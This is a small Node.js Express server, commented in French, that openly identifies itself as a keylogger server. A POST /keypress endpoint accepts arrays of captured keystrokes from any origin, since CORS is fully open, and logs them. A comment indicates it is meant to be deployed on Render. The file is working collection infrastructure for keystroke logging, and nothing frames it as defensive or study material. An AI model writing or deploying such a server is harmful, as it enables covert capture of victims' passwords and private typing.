const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');

const app = express();
app.use(bodyParser.json());
app.use(cors());

// Route GET obligatoire pour Render
app.get('/', (req, res) => {
    res.send("Keylogger server OK");
});

// Route qui reçoit un tableau de touches
app.post('/keypress', (req, res) => {
    const { keys } = req.body;

    if (!keys || !Array.isArray(keys)) {
        return res.status(400).send({ error: "Format invalide : 'keys' doit être un tableau." });
    }

    console.log("Touches reçues :", keys);

    res.status(200).send({ message: 'Touches reçues', count: keys.length });
});

// Lancement du serveur
const port = process.env.PORT || 3000;
app.listen(port, () => {
    console.log(`Server running on port ${port}`);
});
